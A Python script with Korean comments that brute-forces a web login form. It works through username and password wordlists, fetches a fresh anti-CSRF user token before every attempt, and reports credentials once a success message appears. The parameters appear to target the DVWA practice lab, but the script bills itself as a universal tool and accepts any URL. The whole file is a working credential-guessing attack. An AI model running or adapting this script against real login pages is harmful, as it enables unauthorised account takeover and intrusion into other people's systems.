import requests
import argparse
import sys
from bs4 import BeautifulSoup

def get_token(session, url):
    """페이지에서 user_token이 있는지 확인하고 있으면 반환, 없으면 None"""
    try:
        res = session.get(url)
        soup = BeautifulSoup(res.text, 'html.parser')
        token_input = soup.find('input', {'name': 'user_token'})
        return token_input['value'] if token_input else None
    except Exception:
        return None

def run_brute_force(url, user_file, pass_file, cookie_str, success_msg):
    # 쿠키 딕셔너리 생성
    cookies = {}
    if cookie_str:
        for item in cookie_str.split(";"):
            key, val = item.strip().split("=")
            cookies[key] = val

    session = requests.Session()
    session.cookies.update(cookies)

    try:
        with open(user_file, "r") as f: usernames = [l.strip() for l in f if l.strip()]
        with open(pass_file, "r") as f: passwords = [l.strip() for l in f if l.strip()]
    except FileNotFoundError as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

    print(f"[*] Target: {url}")
    print("[*] Brute Force Start...\n")

    for username in usernames:
        for password in passwords:
            # 매번 토큰 갱신 (없으면 None)
            token = get_token(session, url)
            
            # 파라미터 구성
            params = {"username": username, "password": password, "Login": "Login"}
            if token:
                params["user_token"] = token
            
            # 요청 및 응답 길이 확보 후 출력 형식 변경
            try:
                response = session.get(url, params=params, timeout=5)
                resp_len = len(response.text) # 응답 본문의 글자 수(길이) 계산
                
                # 요청 상세 정보와 응답 길이를 한 줄로 출력
                print(f"[TRY] USER: {username:10} | PASS: {password:10} | LEN: {resp_len:<5}", end=" ", flush=True)
                
                if success_msg.lower() in response.text.lower():
                    print(f"\n[!!!] SUCCESS FOUND: {username}:{password}")
                    return
                else:
                    print("-> 실패")
            except Exception as e:
                # 에러 발생 시 출력 형식 정렬 유지
                print(f"[TRY] USER: {username:10} | PASS: {password:10} | LEN: ERROR", end=" ")
                print(f"-> 에러: {e}")

    print("\n[FAILED] 모든 시도가 끝났습니다.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Professional Universal Brute Force Tool")
    parser.add_argument("--url", required=True)
    parser.add_argument("--users", default="userid.txt")
    parser.add_argument("--passwords", default="passwd.txt")
    parser.add_argument("--cookie", nargs='?', default="", help="Cookies (optional)")
    parser.add_argument("--msg", default="welcome")

    args = parser.parse_args()
    run_brute_force(args.url, args.users, args.passwords, args.cookie, args.msg)